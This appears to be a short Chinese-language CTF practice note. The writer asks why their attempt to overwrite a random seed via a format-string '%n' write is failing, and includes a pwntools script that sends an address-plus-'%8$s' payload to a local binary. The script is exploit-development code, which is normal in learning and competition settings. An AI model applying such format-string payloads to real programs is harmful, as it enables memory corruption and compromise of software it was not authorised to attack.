+ 这道题我试着用 `地址+%8$n` 修改种子，但是不成功，不知道为什么

  ```python3
  from pwn import *
  
  context.arch = "amd64"
  
  io = process("/home/pwn/桌面/fmt")
  
  elf = ELF("/home/pwn/桌面/fmt")
  
  io.recvuntil(" world!")
  
  # payload = flat([0x40409c, "aaaaaaaaaaaaaaaaaaa%9$p %9$n"])
  payload = p64(0x40409c) + b'%8$s'
  # payload = flat(["%8$n"])
  # payload = cyclic(10)
  
  pause()
  
  io.send(payload)
  
  print(f"io.recv() = {io.recv()}")
  # t = u64(t)
  # print(t)
  
  # success("t = 0x%x" % u64(t))
  
  print(f"io.recv() = {io.recv()}")
  
  io.interactive()
  ```

  